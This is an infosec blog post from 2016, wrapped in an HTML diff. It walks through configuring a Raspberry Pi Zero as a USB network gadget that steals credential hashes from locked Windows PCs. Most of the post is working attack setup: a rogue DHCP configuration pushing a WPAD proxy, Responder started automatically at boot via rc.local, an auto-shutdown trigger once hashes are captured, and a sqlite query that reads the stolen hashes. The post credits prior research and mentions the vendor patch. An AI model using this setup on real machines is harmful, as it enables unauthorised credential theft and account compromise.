@@ -1,0 +1,398 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+    <title>Raspberry Pi Zero for credential snagging &middot; zone13.io</title>
+    <meta name="author" content="Zone13.io">
+    <meta name="description" content="InfoSec blog">
+    <meta name="generator" content="Hugo 0.16" />
+    <meta name="HandheldFriendly" content="True">
+    <meta name="MobileOptimized" content="320">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+    <!-- RSS autodiscovery -->
+    
+
+    <link rel="shortcut icon" href="https://zone13.github.io/test-host/img/favicon.ico">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/normalize/2.1.2/normalize.min.css">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="https://zone13.github.io/test-host/css/screen.css">
+    <link rel="stylesheet" href="https://zone13.github.io/test-host/css/github.css">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.3/styles/default.min.css">
+
+    <!-- Stylesheet for theme color -->
+    <style type="text/css">
+    a, a:visited {color: #22A7F0;}
+    .pagination a {color: #22A7F0;}
+    .gist .gist-file .gist-meta a:visited {color: #22A7F0 !important;}
+    a:focus, a:hover {color: #000000;}
+    h1.post-title a:focus, h1.post-title a:hover, h1.blog-title a:focus, h1.blog-title a:hover {color: #000000;}
+    .older-posts:hover, .newer-posts:hover {color: #000000;}
+</style>
+</head>
+
+<body class="post-template">
+
+    <header id="site-head">
+	
+	<h1 class="blog-title"><a href="https://zone13.github.io/test-host/">Zone13.io</a></h1>
+	
+	
+	<h1 class="blog-subtitle">InfoSec Blog</h1>
+	
+</header>
+    
+<nav class="menu" role="nav">
+    <ul>
+        
+        	<li class="nav nav-current"><a href="/test-host/info/about-me/">about me</a></li>
+      	
+        	<li class="nav nav-current"><a href="/test-host/info/Disclaimer/">Disclaimer</a></li>
+      	
+    </ul>
+</nav>
+
+
+    <main class="content" role="main">
+	    <article class="post">
+	        <header>
+	        <h1 class="post-title">Raspberry Pi Zero for credential snagging</h1>
+	        <div class="post-meta"><time datetime="18 September 2016">18 September 2016</time></div>
+	        </header>
+
+	        <section class="post-content">
+	            
+
+<blockquote>
+<p>Update: <strong>CVE-2016-3302</strong> / <strong>MS16-112</strong> patch was released by Microsoft to fix the issue.</p>
+</blockquote>
+
+<h3 id="introduction">Introduction</h3>
+
+<p>This post is an extension to Rob Fuller&rsquo;s (@mubix) work - <a href="https://room362.com/post/2016/snagging-creds-from-locked-machines/">https://room362.com/post/2016/snagging-creds-from-locked-machines/</a> to see how a Raspberry Pi Zero can be used for credential snagging. All credits go to @mubix for the original research. It is recommended to read mubix&rsquo;s post (if you haven&rsquo;t already !) before proceeding.</p>
+
+<p><img src="/images/pizero.jpeg" alt="Pi Zero 1.3" /></p>
+
+<h3 id="prerequisites">Prerequisites</h3>
+
+<h4 id="software">Software</h4>
+
+<p>This will <strong>only</strong> work if the target Windows system has <a href="https://en.wikipedia.org/wiki/RNDIS">RNDIS</a> drivers installed. The driver doesn&rsquo;t seem to install automatically (like when you plug in a new mouse or any USB accessory) and has to be installed manually as explained <a href="https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking">here</a> after booting up the Pi Zero for the first time.</p>
+
+<h4 id="hardware">Hardware</h4>
+
+<p>Raspberry Pi Zero (I have v1.3)</p>
+
+<p>Micro SD card (4GB or more) with <a href="https://www.raspberrypi.org/downloads/raspbian/">Raspbian Jessie</a> (I used Jessie Lite, Release date: 2016-05-27)</p>
+
+<p>Micro USB cable (any cable that supports data transfer - try those coming with mobiles)</p>
+
+<h3 id="procedure">Procedure</h3>
+
+<p>I&rsquo;m setting up the Pi Zero from my Windows machine (Windows 8.1). If you are working from a different OS, adopt any changes as necessary (Google is your best friend :)).</p>
+
+<p>I assume that you have already installed the Raspbian Jessie Lite OS on the Micro SD card. On Windows, I prefer to use the <a href="https://sourceforge.net/projects/win32diskimager/">Win32DiskImager</a>. If you are not familiar with the OS flashing process, refer <a href="https://www.raspberrypi.org/documentation/installation/installing-images/">here</a>.</p>
+
+<h4 id="pi-zero-usb-gadget-setup">Pi Zero USB gadget setup</h4>
+
+<p>Insert the Micro SD card with Raspbian OS into a suitable card reader and plug it into the Windows system. Open the boot partition in Windows explorer.</p>
+
+<p>Two files need to be edited here:</p>
+
+<ol>
+<li>config.txt</li>
+</ol>
+
+<p>Append the following on a new line:</p>
+
+<pre><code>   dtoverlay=dwc2
+</code></pre>
+
+<p>The resulting file looks like <a href="https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/config.txt">this</a>.</p>
+
+<ol>
+<li>cmdline.txt</li>
+</ol>
+
+<p>Insert the following after <strong>rootwait</strong>:</p>
+
+<pre><code>   modules-load=dwc2,g_ether
+</code></pre>
+
+<p>Be careful with the formatting on this one, the values are separated by spaces.</p>
+
+<p>The resulting file looks like <a href="https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/cmdline.txt">this</a>.</p>
+
+<p>Once both the files are edited and saved, eject the Micro SD card and insert into the Pi Zero slot. Connect the Pi Zero to the Windows system using the Micro USB cable.</p>
+
+<blockquote>
+<p>Note: The cable has to be connected to the Micro USB port of Pi Zero to be used as a USB gadget.</p>
+</blockquote>
+
+<h4 id="pi-zero-packages-setup">Pi Zero packages setup</h4>
+
+<p>If the Pi Zero is not detected by Windows system after booting up, it means that RNDIS drivers are not installed. The drivers can be installed by following the procedure <a href="https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking">here</a>.</p>
+
+<p>Once the RNDIS devices are installed, the new USB Ethernet will be visible under <strong>Network Connections</strong>.</p>
+
+<p><img src="/images/net_conns_adapter.png" alt="net_conns_adapter" /></p>
+
+<blockquote>
+<p>Note: I have renamed my adapter as <strong>PiZero</strong> and hence displayed above.</p>
+</blockquote>
+
+<p>There are a number of packages that need to be installed on the Pi Zero to be used a credential snagging device. For this to happen, the Pi Zero will need Internet access.</p>
+
+<p>I decided to share my LAN Internet with Pi Zero for this purpose. You can do the same or even share your Wi-Fi Internet.</p>
+
+<p><img src="/images/share_internet.png" alt="share_internet" /></p>
+
+<p>At this stage you should be able to ping Pi Zero (hostname: <em>raspberrypi.local</em>)</p>
+
+<p><img src="/images/ping_pizero_local.png" alt="ping_pizero_local" /></p>
+
+<p>Now, you can SSH to Pi Zero using the hostname.</p>
+
+<p>The default credentials are:</p>
+
+<blockquote>
+<p>username: pi</p>
+
+<p>password: raspberry</p>
+</blockquote>
+
+<p><img src="/images/putty_settings.png" alt="putty_settings" /></p>
+
+<p>At this point, it is a good idea to check Internet connectivity for the Pi Zero (e.g. try pinging google.com). If the ping can resolve to IP (not getting a ping response is alright), you are good to go. If there is some connectivity error, try running:</p>
+
+<pre><code class="language-sh">sudo dhclient usb0
+</code></pre>
+
+<p>Now, proceed with running the below commands in order:</p>
+
+<pre><code class="language-sh">sudo apt-get update
+sudo apt-get install -y python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools
+
+sudo mkdir tools
+cd tools
+git clone https://github.com/spiderlabs/responder
+</code></pre>
+
+<h4 id="configure-a-static-ip">Configure a static IP</h4>
+
+<p>Open /etc/network/interfaces</p>
+
+<pre><code class="language-sh">sudo nano /etc/network/interfaces
+</code></pre>
+
+<p>Paste the below code at the end of the file:</p>
+
+<pre><code class="language-sh">auto usb0
+allow-hotplug usb0
+iface usb0 inet static
+  address 192.168.2.201
+  netmask 255.255.255.0
+  gateway 192.168.2.1
+</code></pre>
+
+<p><img src="/images/etc_interfaces.png" alt="etc_interfaces" /></p>
+
+<h4 id="dhcp-server-setup">DHCP server setup</h4>
+
+<p>Backup the existing config file and create a new one for our setup</p>
+
+<pre><code class="language-sh">sudo mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bkp
+sudo nano /etc/dhcp/dhcpd.conf
+</code></pre>
+
+<p>Paste the below code:</p>
+
+<pre><code class="language-sh">ddns-update-style none;
+
+option domain-name &quot;domain.local&quot;;
+option domain-name-servers 192.168.2.201;
+
+default-lease-time 60;
+max-lease-time 72;
+
+# If this DHCP server is the official DHCP server for the local
+# network, the authoritative directive should be uncommented.
+authoritative;
+
+# Use this to send dhcp log messages to a different log file (you also
+# have to hack syslog.conf to complete the redirection).
+log-facility local7;
+
+# wpad
+option local-proxy-config code 252 = text;
+
+# A slightly different configuration for an internal subnet.
+subnet 192.168.2.0 netmask 255.255.255.0 {
+  range 192.168.2.1 192.168.2.2;
+  option routers 192.168.2.201;
+  option local-proxy-config &quot;http://192.168.2.201/wpad.dat&quot;;
+}
+</code></pre>
+
+<h4 id="run-scripts-at-boot">Run scripts at boot</h4>
+
+<p>Open the /etc/rc.local file.</p>
+
+<pre><code class="language-sh">sudo nano /etc/rc.local
+</code></pre>
+
+<p>Paste the below code before <strong>exit 0</strong>.</p>
+
+<pre><code class="language-sh"># Clear leases
+rm -f /var/lib/dhcp/dhcpd.leases
+touch /var/lib/dhcp/dhcpd.leases
+
+# Start DHCP server
+/usr/sbin/dhcpd
+
+# Start Responder
+/usr/bin/screen -dmS responder bash -c 'cd /home/pi/tools/responder/; python Responder.py -I usb0 -f -w -r -d -F'
+
+# Monitor Responder.db and shutdown once the hashes are captured
+echo &quot;Staring cred watch&quot; &gt;&gt; /root/rc.log
+/usr/bin/screen -dmS notify bash -c 'while inotifywait -e modify /home/pi/tools/responder/Responder.db; do shutdown -h now; done'
+</code></pre>
+
+<h4 id="create-logs-for-screen-sessions">Create logs for screen sessions</h4>
+
+<p>Create a <strong>logs</strong> folder:</p>
+
+<pre><code class="language-sh">sudo mkdir /root/logs
+</code></pre>
+
+<p>Add a .screenrc file</p>
+
+<pre><code class="language-sh">sudo nano /root/.screenrc
+</code></pre>
+
+<p>Paste the below code in .screenrc file:</p>
+
+<pre><code class="language-sh"># Logging
+deflog on
+logfile /root/logs/screenlog_$USER_.%H.%n.%Y%m%d-%0c:%s.%t.log
+</code></pre>
+
+<p>That concludes the setup.</p>
+
+<h3 id="conclusion">Conclusion</h3>
+
+<p>Try plugging in the Pi Zero to a locked Windows PC and wait. If all goes well, the Responder.db file will be created at <strong>/home/pi/tools/responder/</strong> and hashes will be stored.</p>
+
+<p>The captured hashes can be viewed using <strong>sqlite3</strong>.</p>
+
+<pre><code class="language-sh">sqlite3 /home/pi/tools/responder/Responder.db
+
+select * from responder;
+</code></pre>
+
+<p><img src="/images/sqlite3_out.png" alt="sqlite3_out" /></p>
+
+	        </section>
+
+	        <section class="post-tags" style="padding-bottom:60px;">
+	            <div class="post-meta tags">
+	            <i class="fa fa-fw fa-tag"></i>
+	            
+	            <a href="https://zone13.github.io/test-host/tags/RaspberryPi">RaspberryPi </a>
+	            
+	            <a href="https://zone13.github.io/test-host/tags/PiZero">PiZero </a>
+	            
+	            <a href="https://zone13.github.io/test-host/tags/Credentials">Credentials </a>
+	            
+	            <a href="https://zone13.github.io/test-host/tags/go">go </a>
+	            
+	            </div>
+	        </section>
+			
+			
+	        	<div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'zone13-io';
+    var disqus_identifier = 'https:\/\/zone13.github.io\/test-host\/post\/Raspberry-Pi-Zero-for-credential-snagging\/';
+    var disqus_title = 'Raspberry Pi Zero for credential snagging';
+    var disqus_url = 'https:\/\/zone13.github.io\/test-host\/post\/Raspberry-Pi-Zero-for-credential-snagging\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+	        
+			
+			
+
+	        <section class="share">
+	            <p class="backtotop"><a data-scroll href="#site-head"><i class="fa fa-lg fa-fw fa-angle-double-up"></i></a><a data-scroll class="backtotoptext" href="#site-head"> Back to top</a></p>
+	            <p class="info prompt">Share</p>
+	            <a href="http://twitter.com/share?text=Raspberry%20Pi%20Zero%20for%20credential%20snagging&url=https%3a%2f%2fzone13.github.io%2ftest-host%2fpost%2fRaspberry-Pi-Zero-for-credential-snagging%2f" title="Share on Twitter"
+	                onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+	                <i class="fa fa-2x fa-fw fa-twitter-square"></i> <span class="hidden">Twitter</span>
+	            </a>
+	            <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fzone13.github.io%2ftest-host%2fpost%2fRaspberry-Pi-Zero-for-credential-snagging%2f" title="Share on Facebook"
+	                onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+	                <i class="fa fa-2x fa-fw fa-facebook-square" style="margin-left: -8px"></i> <span class="hidden">Facebook</span>
+	            </a>
+	            <a href="https://plus.google.com/share?url=https%3a%2f%2fzone13.github.io%2ftest-host%2fpost%2fRaspberry-Pi-Zero-for-credential-snagging%2f" title="Share on Google+"
+	               onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+	                <i class="fa fa-2x fa-fw fa-google-plus-square" style="margin-left: -8px"></i> <span class="hidden">Google+</span>
+	            </a>
+	        </section>
+
+	        <footer class="post-footer">
+	            <section class="author">
+    <div class="authorimage" style="background: url(https://zone13.github.io/test-host/img/avatar.jpg)"></div>
+    <h4>Zone13.io</h4>
+    <p class="bio">Blog dedicated to Information Security, Python, Raspberry Pi..</p>
+    <p class="meta">
+      
+    </p>
+</section>
+	        </footer>
+	    </article>
+	</main>
+
+    <footer class="site-footer">
+	<div class="inner">
+		<section class="footer-social">
+			
+		    <a href="//twitter.com/zone13_io" target="_blank" title="Twitter"><i class="fa fa-2x fa-fw fa-twitter"></i> <span class="hidden">Twitter</span></a>&nbsp;
+		    
+		    
+		    <a href="//github.com/zone13" target="_blank" title="GitHub"><i class="fa fa-2x fa-fw fa-github"></i> <span class="hidden">GitHub</span></a>&nbsp;
+		    
+		
+		</section>
+
+		<section class="copyright">&copy; 2016 <a href="https://zone13.github.io/test-host/">Zone13.io</a>. zone13.io</section>
+	</div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="https://zone13.github.io/test-host/js/index.js"></script>
+<script src="https://zone13.github.io/test-host/js/smooth-scroll.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.3/highlight.min.js"></script>
+
+<script>
+    smoothScroll.init({
+        speed: 800,
+        easing: 'easeInOutCubic',
+        updateURL: false,
+        offset: 125,
+    });
+</script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+</body>
+</html>
